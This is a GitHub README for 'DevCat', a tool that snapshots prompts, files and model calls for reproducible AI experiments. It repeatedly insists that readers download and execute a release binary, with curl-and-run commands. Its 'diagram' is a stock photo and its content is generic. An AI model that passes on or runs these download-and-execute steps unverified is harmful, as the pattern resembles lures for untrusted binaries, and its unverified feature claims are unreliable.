# DevCat — Self-contained Snapshot and Context for AI Dev Loop

[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/Gdizh/devcat/releases)

A self-contained snapshot and context tool for your AI development loop. DevCat captures state, manages context, and helps you reproduce prompts, data, and model inputs across experiments.

<!-- Badges -->
[![Build Status](https://img.shields.io/badge/build-passing-brightgreen)](https://github.com/Gdizh/devcat/actions)
[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Topics](https://img.shields.io/badge/topics-ai%20%7C%20llm%20%7C%20context%20%7C%20snapshot-orange)](#)

![DevCat diagram](https://images.unsplash.com/photo-1518770660439-4636190af475?auto=format&fit=crop&w=1400&q=80)

Table of contents

- Features
- Why DevCat
- Quick download and run
- Install and get started
- CLI reference
- API usage (Python)
- Snapshot format
- Context stitching and diff
- Integrations and providers
- Storage backends
- Example workflows
- Debugging and reproducibility
- Testing and CI
- Security and privacy
- Performance tips
- Contribution guide
- Releases
- License

Features

- Capture a self-contained snapshot of inputs, prompts, files, metadata, and model settings.
- Store context windows as compact artifacts linked to experiments.
- Compute diffs between snapshots to show prompt drift and data changes.
- Stitch context with embeddings and retrieval for long conversations.
- Support common providers: OpenAI, Ollama, Anthropic/Claude, Qwen, GPT5.
- Integrate with local LLMs and remote APIs.
- Use filesystem, SQLite, or S3 backends for storage.
- Provide a CLI and a small Python API for automation.
- Produce a human-readable archive for audits and reproducibility.

Why DevCat

DevCat targets one problem. Reproducing prompt results across time and systems requires a precise record of context. DevCat records that context. It records prompt text, variables, file contents, environment variables, model parameters, and the final model call. You can attach a snapshot to an experiment ID. You can diff two snapshots to understand what changed.

Quick download and run

You can download the packaged release and execute it. Visit the Releases page and download the latest asset. The file must be downloaded and executed.

Download the latest Linux binary and run:

```bash
curl -L -o devcat-linux-amd64.tar.gz https://github.com/Gdizh/devcat/releases/download/v1.2.3/devcat-linux-amd64.tar.gz
tar -xzf devcat-linux-amd64.tar.gz
chmod +x devcat
./devcat --help
```

The same page contains builds for macOS and Windows. Replace the asset name to match your platform. If the link does not work, check the Releases section below or visit the Releases page: https://github.com/Gdizh/devcat/releases

Install and get started

Install from a release archive or build from source. The archive contains a CLI, a small Python wheel, and example manifests. The archive name follows this pattern: devcat-{os}-{arch}-{version}.tar.gz

Filesystem install (Linux/macOS):

```bash
# download latest release (example version)
curl -L -o devcat.tar.gz https://github.com/Gdizh/devcat/releases/download/v1.2.3/devcat-linux-amd64.tar.gz
tar -xzf devcat.tar.gz
sudo mv devcat /usr/local/bin/
devcat --version
```

Python install (from wheel inside release):

```bash
pip install dist/devcat-1.2.3-py3-none-any.whl
```

Homebrew (example tap pattern):

```bash
brew tap gdizh/devcat
brew install devcat
```

First snapshot

Create a snapshot from a directory that contains your prompt, data, and a run script.

```bash
cd my-experiment
devcat snapshot create --name "baseline-model" --dir . --meta '{"model":"gpt-4","temp":0.0}'
```

This command creates an artifact file in the local store. It records files, environment variables, and the provided metadata.

CLI reference

Commands reflect typical workflows. All commands accept --store to point to the backend.

General

- devcat --version
- devcat help

Snapshot

- devcat snapshot create --name NAME --dir PATH [--meta JSON]
- devcat snapshot list [--filter KEY=VALUE]
- devcat snapshot show ID
- devcat snapshot export ID --format tar.gz --out PATH
- devcat snapshot import PATH

Context

- devcat context push --snapshot ID --name "chat-2025-05-01"
- devcat context list
- devcat context retrieve --name NAME [--q "last prompt"]

Diff

- devcat diff snapshots ID1 ID2 [--format unified|json]
- devcat diff files ID1 ID2 --path file.txt

Run

- devcat run --snapshot ID --provider openai --model gpt-4 --prompt-file prompt.txt [--out out.json]

Debug

- devcat inspect ID --raw
- devcat verify ID

Common flags

- --store FILE|sqlite:///path/to/db|s3://bucket
- --verbose
- --yes

Examples

Create and export a snapshot, then execute a stored run:

```bash
# create snapshot
devcat snapshot create --name "exp-01" --dir ./exp-01 --meta '{"run":"a"}'

# export snapshot to share
devcat snapshot export exp-01 --format tar.gz --out exp-01.tar.gz

# import on another machine
devcat snapshot import exp-01.tar.gz

# run the stored call
devcat run --snapshot exp-01 --provider openai --model gpt-4 --prompt-file prompt.txt --out results.json
```

API usage (Python)

DevCat ships with a small API to automate snapshot capture, context stitching, and diffing.

Install the wheel from the release or from PyPI (if available):

```bash
pip install devcat
```

Sample code

```python
from devcat import Client

c = Client(store="sqlite:///tmp/devcat.db")

# capture a run
snap = c.snapshot.create(name="py-run", directory="./", meta={"model": "gpt-4"})

# attach a prompt and run
snap.add_prompt(open("prompt.txt").read())
snap.add_env({"PYTHONPATH": "/app"})
snap.commit()

# perform a model call via provider integration
result = c.run(snapshot_id=snap.id, provider="openai", model="gpt-4", prompt_file="prompt.txt")
print(result.output)

# compute a diff with a previous snapshot
diff = c.diff(snap.id, "previous-snap-id")
print(diff.as_text())
```

Snapshot format

DevCat stores snapshots as compact JSON-plus-blobs artifacts. Each snapshot contains:

- id: UUID
- name: string
- timestamp: ISO 8601
- meta: freeform JSON
- files: list of file entries {path, hash, size, content-type}
- env: key-value map of captured environment variables
- prompts: list of prompt entries {text, role, annotated_tokens}
- calls: list of model call entries {provider, model, params, response, token_counts}
- embeddings: optional vector entries for prompt chunks
- metrics: runtime and resource usage data
- provenance: tool versions, git refs, container id

Storage preserves the file tree. Large files are stored as blobs. DevCat keeps deduplication by hash. You can export a snapshot as a tar.gz that contains a manifest.json and a blobs directory.

Context stitching

Context stitching merges short-term prompt context with retrieved items. DevCat supports three modes:

- concat: append retrieved items to prompt until token budget
- rerank: rank retrieved items by relevance and include top-K
- embed-retrieval: embed prompt and query vector store, fetch neighbors, then condense

DevCat has a small retriever that uses sentence-transformer-style embeddings. The CLI exposes commands to create and maintain vector stores. Vector stores are compatible with SQLite + FAISS, Annoy, or a cloud provider.

Diff and drift

DevCat computes diffs at three levels:

- file-level diff: text diffs for files in snapshot
- prompt diff: token-level diff for prompt changes
- call diff: parameter and response diffs for model calls

You can run:

```bash
devcat diff snapshots exp-old exp-new --format unified > changes.patch
```

Diff output is JSON or unified text. DevCat labels changes to inputs that impact model output: prompt edits, model param changes, or new files.

Integrations and providers

DevCat supports provider adapters. Adapters wrap provider APIs and normalize calls and responses.

Built-in adapters include:

- openai: supports chat/completions and streaming
- ollama: local LLM serving
- anthropic (Claude): chat-style
- qwen: Qwen-coder and Qwen
- gpt5: placeholder for future interfaces
- local: run a local process that prints output (useful for tests)

Adapters record:

- provider name and version
- model id and commit
- request parameters (temperature, max_tokens, top_p)
- response content and token usage
- raw provider payload

Adapter configuration

Config file example (.devcat/config.yaml)

```yaml
providers:
  openai:
    api_key_env: OPENAI_API_KEY
    base_url: https://api.openai.com
  ollama:
    host: http://localhost:11434
    api_key_env: OLLAMA_KEY
stores:
  default: sqlite:///tmp/devcat.db
  s3:
    bucket: my-devcat-bucket
    region: us-west-2
```

Storage backends

DevCat supports backends through pluggable drivers.

- Local filesystem: default, simple, fast for single-user.
- SQLite: embedded DB for structured queries and small teams.
- S3-compatible: for cloud storage and team sharing.
- MinIO: for private S3-like stores.

Configure store with a URI:

- file:///path/to/store
- sqlite:///path/to/devcat.db
- s3://bucket-name/path

Store migration and pruning

DevCat includes commands to compact and prune old snapshots. Use snapshot.gc to remove unreachable blobs after a retention period.

Example workflows

1) Local experiment capture and reproduce

- Create an experiment directory with prompt and helper scripts.
- Run devcat snapshot create before running the model.
- Store the snapshot id in the experiment metadata.
- After the run, export the snapshot and attach the result JSON.

2) Team handoff

- Capture a snapshot with files, prompts, and run metadata.
- Export to tar.gz and upload to a shared storage or attach to an issue.
- A teammate imports the snapshot, runs devcat run, and verifies the output.

3) CI-driven regression test

- On commit, capture snapshot of test prompt and expected output.
- Run devcat run in CI using a sandbox provider or a mocked adapter.
- Diff result with baseline snapshot. If diff appears, fail build.

4) Long conversation stitching

- Save each chat turn as a mini snapshot.
- Use devcat context push to maintain a sliding window.
- When context grows, use embeddings to select top relevant turns.

Debugging and reproducibility

DevCat records environment values that impact runs. It captures:

- OS and kernel version
- Python version and installed packages (pip freeze)
- Container image id if run inside Docker
- Git commit and branch for the working directory

This data helps reproduce a run. When a result deviates, run devcat diff to compare:

- prompt text
- model parameters
- files present
- environment variables

DevCat can run verifications that replay the model call in a deterministic fashion against the stored prompt and parameters. For providers that support deterministic seeds or orchestration, devcat will set the seed in provider call.

Testing and CI

DevCat includes a lightweight test harness. Use tests to ensure snapshots match golden outputs.

Local test example:

```bash
# run tests that create snapshots and compare to baselines
pytest tests/
```

CI pattern:

- Use a matrix job that runs devcat commands on different providers.
- Store artifacts in CI and export snapshots to a central bucket.
- Block merges if a regression appears.

Security and privacy

DevCat can capture secrets if they appear in files or environment variables. Use filters to avoid storing secrets in snapshots. The config allows source filtering:

- .devcat/filters.yaml

```yaml
exclude_paths:
  - secrets/*
exclude_env:
  - AWS_SECRET_ACCESS_KEY
  - OPENAI_API_KEY
```

Encryption

- For S3 store, enable server-side encryption.
- DevCat supports client-side encryption with a key management hook.

Access control

- Control access via the storage backend (S3 policies, DB access).
- For shared deployments, proxy devcat requests through an auth layer.

Performance tips

- Use SQLite for single host workloads.
- Use S3 or object storage for large datasets.
- Prune old snapshots proactively.
- Use deduplication to save space on repeated files.
- When capturing many snapshots, increase the hash worker pool.

Common patterns

- Snapshot per experiment run. Name snapshots with experiment id and timestamp.
- Keep the prompt in a single file. Reference it in snapshot meta.
- Use minimal metadata keys: model, provider, seed, experiment_id.

Snapshot naming convention

- {project}/{experiment}/{version}-{timestamp}
- Examples: projectX/exp-12/v1-2025-05-01T12:00:00Z

Advanced: embedding and vector stores

DevCat supports embedding generation and local vector stores. Workflow:

- Chunk prompt or files into pieces.
- Generate embeddings using a provider.
- Store embeddings in the configured vector store.
- On retrieval, embed the query and fetch nearest neighbors.
- Use reranker to select items to include.

Index types supported:

- SQLite + FAISS
- Annoy
- HNSWlib

Example:

```bash
devcat embeddings create --snapshot exp-01 --field prompts --index sqlite://./vectors.db
devcat embeddings query --index sqlite://./vectors.db --q "What was the model asked?"
```

Provider stubbing and testing

DevCat includes a stub provider for tests. Use it to record expected outputs without external calls. The stub returns fixed outputs and token counts.

```yaml
providers:
  stub:
    responses:
      - request_hash: abc123
        output: "Hello from stub"
```

Docker and containers

Run DevCat inside a container for consistency.

Dockerfile example:

```dockerfile
FROM python:3.11-slim
COPY dist/devcat-1.2.3-py3-none-any.whl /tmp/
RUN pip install /tmp/devcat-1.2.3-py3-none-any.whl
ENTRYPOINT ["devcat"]
```

Compose example for local server (vector store + devcat):

```yaml
version: "3"
services:
  devcat:
    image: gdizh/devcat:1.2.3
    volumes:
      - ./data:/data
    environment:
      - DEV_CAT_STORE=sqlite:///data/devcat.db
```

Extending DevCat

Adapter interface

Create a new adapter by implementing the provider interface. The adapter must:

- accept normalized input (prompt, params)
- return a normalized response (text, tokens, usage)
- expose provider metadata (name, api_version)

Pluggable storage

Write a driver that implements:

- put_blob(blob) -> digest
- get_blob(digest) -> bytes
- store_snapshot(manifest) -> id
- list_snapshots(filter)

Schema and validation

DevCat exposes a schema for snapshot manifests in JSON Schema. Clients can validate against the schema before importing.

Example manifest fields

- id (string, uuid)
- name (string)
- files (array)
- prompts (array)
- calls (array)
- embeddings (array)

Common commands for maintainers

- devcat admin compact --store sqlite:///tmp/devcat.db
- devcat admin migrate --from v1 --to v2
- devcat admin garbage-collect --older-than 30d

Contributor guide

- Fork repository
- Create a feature branch per issue
- Write tests
- Run linters and formatters
- Open a pull request and link an issue

Code style

- Python: black, isort, flake8
- Go: gofmt
- Shell: shellcheck

Issue labels

- bug
- enhancement
- help wanted
- good first issue

Roadmap items (examples)

- Add native Windows executable builds.
- Add Rust bindings for a lightweight core.
- Add streaming adapters for more providers.
- Build a hosted UI for snapshot browsing.

Releases

Download the package and run the binary from the Releases page. The release contains platform-specific assets and a wheel. Download the appropriate asset for your platform and execute the included binary or installer.

Visit releases: https://github.com/Gdizh/devcat/releases

Example of running a release asset once downloaded

```bash
# Example for macOS
curl -L -o devcat-macos-amd64.tar.gz https://github.com/Gdizh/devcat/releases/download/v1.2.3/devcat-macos-amd64.tar.gz
tar -xzf devcat-macos-amd64.tar.gz
chmod +x devcat
./devcat snapshot create --name "mac-test" --dir .
```

If you cannot reach the link, open the Releases section on the repository page and pick the desired asset.

Roadmap and design notes

Design goals

- Deterministic snapshots. Capture enough data to reproduce a run.
- Low friction capture. Make snapshot creation a single command.
- Provider-agnostic. Normalize model calls across providers.
- Compact storage. Deduplicate blobs.

Data model choices

- Separate blobs and manifests to allow streaming export.
- Hash-based deduplication to avoid repeated storage.
- JSON manifest to keep the format readable and scriptable.

Tradeoffs

- Recording a full environment increases reproducibility but raises privacy concerns. Use filters.
- Embedding large corpora increases storage cost. Use a separate vector store.

Example projects that can use DevCat

- Research teams tracking prompt experiments.
- MLOps pipelines that require audits.
- Chatbot systems that need exact reproduction for bug reports.
- Prompt engineering sessions where context drift needs tracking.

Glossary

- Snapshot: A capture of files, prompts, environment, and metadata for a run.
- Context: A set of items assembled for a prompt, often used as the context window.
- Diff: A comparison between two snapshots.
- Adapter: Code that maps provider API calls to the DevCat normalized format.
- Blob: A stored binary or large file.
- Vector store: A datastore for embeddings and nearest-neighbor search.

Common troubleshooting steps

- If a snapshot import fails, verify the manifest schema.
- If run results differ, compare prompt text and model params with devcat diff.
- If storage fails, check permissions on the store URI.

Compatibility

- Works with standard POSIX systems and Docker.
- Supports major LLM providers through adapters.
- Uses JSON manifest for maximum interoperability.

FAQ (brief)

Q: Can I store secrets?
A: You can, but configure filters to avoid storing sensitive values.

Q: Can I use DevCat in CI?
A: Yes. Use the CLI and the stub provider for deterministic checks.

Q: How do I share a snapshot?
A: Export to tar.gz and upload to a shared storage or attach it to an issue.

Roadmap for community contributions

- Add a UI for browsing snapshots.
- Add finer-grained ACLs for shared stores.
- Add more provider adapters and test matrices.

License

This repository uses the MIT license. See the LICENSE file.

Credits

DevCat borrows ideas from reproducible research tools and MLOps patterns. It aims to be a focused utility for prompt and context capture.

Contact and support

Open issues on GitHub for bugs or feature requests. Pull requests welcome.

Releases and downloads

Get the latest release and platform assets at: https://github.com/Gdizh/devcat/releases

The Releases page lists packaged binaries and the Python wheel. Download the asset that matches your OS and architecture and execute the included binary or install the wheel for Python integration.